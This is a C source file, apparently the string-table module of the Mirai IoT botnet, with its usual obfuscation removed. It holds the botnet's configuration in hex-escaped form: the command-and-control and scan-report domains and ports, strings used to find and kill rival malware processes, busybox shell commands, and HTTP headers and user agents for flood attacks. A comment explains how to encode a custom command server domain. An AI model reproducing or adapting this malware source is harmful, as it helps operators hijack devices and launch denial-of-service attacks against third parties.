#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeadbeef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
// removeed obfuscation
// use the folowing bash magic to create domain or other things for this hexadecimal escaped nonesense
//
// $echo example.com | hexdump -e '1/1 "\\\x"' -e '1/1 "%.2x"'
// \x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x0a
// remember to add null byte on end

add_entry(TABLE_CNC_DOMAIN, "\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x00", 17); //changed to example.com
add_entry(TABLE_CNC_PORT, "\x00\x17", 2);
add_entry(TABLE_SCAN_CB_DOMAIN, "\x72\x65\x70\x6f\x72\x74\x2e\x63\x68\x61\x6e\x67\x65\x6d\x65\x2e\x63\x6f\x6d\x00", 20);
add_entry(TABLE_SCAN_CB_PORT, "\xbb\xe5", 2);
add_entry(TABLE_EXEC_SUCCESS, "\x6c\x69\x73\x74\x65\x6e\x69\x6e\x67\x20\x74\x75\x6e\x30\x00", 15);
add_entry(TABLE_KILLER_SAFE, "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x6f\x75\x74\x75\x2e\x62\x65\x2f\x64\x51\x77\x34\x77\x39\x57\x67\x58\x63\x51\x00", 29);
add_entry(TABLE_KILLER_PROC, "\x2f\x70\x72\x6f\x63\x2f\x00", 7);
add_entry(TABLE_KILLER_EXE, "\x2f\x65\x78\x65\x00", 5);
add_entry(TABLE_KILLER_DELETED, "\x20\x28\x64\x65\x6c\x65\x74\x65\x64\x29\x00", 11);
add_entry(TABLE_KILLER_FD, "\x2f\x66\x64\x00", 4);
add_entry(TABLE_KILLER_ANIME, "\x2e\x61\x6e\x69\x6d\x65\x00", 7);
add_entry(TABLE_KILLER_STATUS, "\x2f\x73\x74\x61\x74\x75\x73\x00", 8);
add_entry(TABLE_MEM_QBOT, "\x52\x45\x50\x4f\x52\x54\x20\x25\x73\x3a\x25\x73\x00", 13);
add_entry(TABLE_MEM_QBOT2, "\x48\x54\x54\x50\x46\x4c\x4f\x4f\x44\x00", 10);
add_entry(TABLE_MEM_QBOT3, "\x4c\x4f\x4c\x4e\x4f\x47\x54\x46\x4f\x00", 10);
add_entry(TABLE_MEM_UPX, "\x5c\x78\x35\x38\x5c\x78\x34\x44\x5c\x78\x34\x45\x5c\x78\x34\x45\x5c\x78\x34\x33\x5c\x78\x35\x30\x5c\x78\x34\x36\x5c\x78\x32\x32\x00", 33);
add_entry(TABLE_MEM_ZOLLARD, "\x7a\x6f\x6c\x6c\x61\x72\x64\x00", 8);
add_entry(TABLE_MEM_REMAITEN, "\x47\x45\x54\x4c\x4f\x43\x41\x4c\x49\x50\x00", 11);
add_entry(TABLE_SCAN_SHELL, "\x73\x68\x65\x6c\x6c\x00", 6);
add_entry(TABLE_SCAN_ENABLE, "\x65\x6e\x61\x62\x6c\x65\x00", 7);
add_entry(TABLE_SCAN_SYSTEM, "\x73\x79\x73\x74\x65\x6d\x00", 7);
add_entry(TABLE_SCAN_SH, "\x73\x68\x00", 3);
add_entry(TABLE_SCAN_QUERY, "\x2f\x62\x69\x6e\x2f\x62\x75\x73\x79\x62\x6f\x78\x20\x4d\x49\x52\x41\x49\x00", 19);
add_entry(TABLE_SCAN_RESP, "\x4d\x49\x52\x41\x49\x3a\x20\x61\x70\x70\x6c\x65\x74\x20\x6e\x6f\x74\x20\x66\x6f\x75\x6e\x64\x00", 24);
add_entry(TABLE_SCAN_NCORRECT, "\x6e\x63\x6f\x72\x72\x65\x63\x74\x00", 9);
add_entry(TABLE_SCAN_PS, "\x2f\x62\x69\x6e\x2f\x62\x75\x73\x79\x62\x6f\x78\x20\x70\x73\x00", 16);
add_entry(TABLE_SCAN_KILL_9, "\x2f\x62\x69\x6e\x2f\x62\x75\x73\x79\x62\x6f\x78\x20\x6b\x69\x6c\x6c\x20\x2d\x39\x20\x00", 22);
add_entry(TABLE_ATK_VSE, "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", 21);
add_entry(TABLE_ATK_RESOLVER, "\x2f\x65\x74\x63\x2f\x72\x65\x73\x6f\x6c\x76\x2e\x63\x6f\x6e\x66\x00", 17);
add_entry(TABLE_ATK_NSERV, "\x6e\x61\x6d\x65\x73\x65\x72\x76\x65\x72\x20\x00", 12);
add_entry(TABLE_ATK_KEEP_ALIVE, "\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x6b\x65\x65\x70\x2d\x61\x6c\x69\x76\x65\x00", 23);
add_entry(TABLE_ATK_ACCEPT, "\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c\x3b\x71\x3d\x30\x2e\x39\x2c\x69\x6d\x61\x67\x65\x2f\x77\x65\x62\x70\x2c\x2a\x2f\x2a\x3b\x71\x3d\x30\x2e\x38\x00", 83);
add_entry(TABLE_ATK_ACCEPT_LNG, "\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x38\x00", 32);
add_entry(TABLE_ATK_CONTENT_TYPE, "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x77\x77\x77\x2d\x66\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\x63\x6f\x64\x65\x64\x00", 48);
add_entry(TABLE_ATK_SET_COOKIE, "\x73\x65\x74\x43\x6f\x6f\x6b\x69\x65\x28\x27\x00", 12);
add_entry(TABLE_ATK_REFRESH_HDR, "\x72\x65\x66\x72\x65\x73\x68\x3a\x00", 9);
add_entry(TABLE_ATK_LOCATION_HDR, "\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x00", 10);
add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x73\x65\x74\x2d\x63\x6f\x6f\x6b\x69\x65\x3a\x00", 12);
add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x63\x6f\x6e\x74\x65\x6e\x74\x2d\x6c\x65\x6e\x67\x74\x68\x3a\x00", 16);
add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x74\x72\x61\x6e\x73\x66\x65\x72\x2d\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x00", 19);
add_entry(TABLE_ATK_CHUNKED, "\x63\x68\x75\x6e\x6b\x65\x64\x00", 8);
add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x6b\x65\x65\x70\x2d\x61\x6c\x69\x76\x65\x00", 11);
add_entry(TABLE_ATK_CONNECTION_HDR, "\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x00", 12);
add_entry(TABLE_ATK_DOSARREST, "\x73\x65\x72\x76\x65\x72\x3a\x20\x64\x6f\x73\x61\x72\x72\x65\x73\x74\x00", 18);
add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x73\x65\x72\x76\x65\x72\x3a\x20\x63\x6c\x6f\x75\x64\x66\x6c\x61\x72\x65\x2d\x6e\x67\x69\x6e\x78\x00", 25);
add_entry(TABLE_HTTP_ONE, "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x4f\x57\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x35\x31\x2e\x30\x2e\x32\x37\x30\x34\x2e\x31\x30\x33\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x00", 111);
add_entry(TABLE_HTTP_TWO, "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x4f\x57\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x35\x32\x2e\x30\x2e\x32\x37\x34\x33\x2e\x31\x31\x36\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x00", 111);
add_entry(TABLE_HTTP_THREE, "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x35\x31\x2e\x30\x2e\x32\x37\x30\x34\x2e\x31\x30\x33\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x00", 110);
add_entry(TABLE_HTTP_FOUR, "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x35\x32\x2e\x30\x2e\x32\x37\x34\x33\x2e\x31\x31\x36\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x00", 110);
add_entry(TABLE_HTTP_FIVE, "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x4d\x61\x63\x69\x6e\x74\x6f\x73\x68\x3b\x20\x49\x6e\x74\x65\x6c\x20\x4d\x61\x63\x20\x4f\x53\x20\x58\x20\x31\x30\x5f\x31\x31\x5f\x36\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x36\x30\x31\x2e\x37\x2e\x37\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x56\x65\x72\x73\x69\x6f\x6e\x2f\x39\x2e\x31\x2e\x32\x20\x53\x61\x66\x61\x72\x69\x2f\x36\x30\x31\x2e\x37\x2e\x37\x00", 117);

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif
//NO OBFUSCATION NEEDED. FIXED.
    //toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif
    //NO OBFUSCATION
    //toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
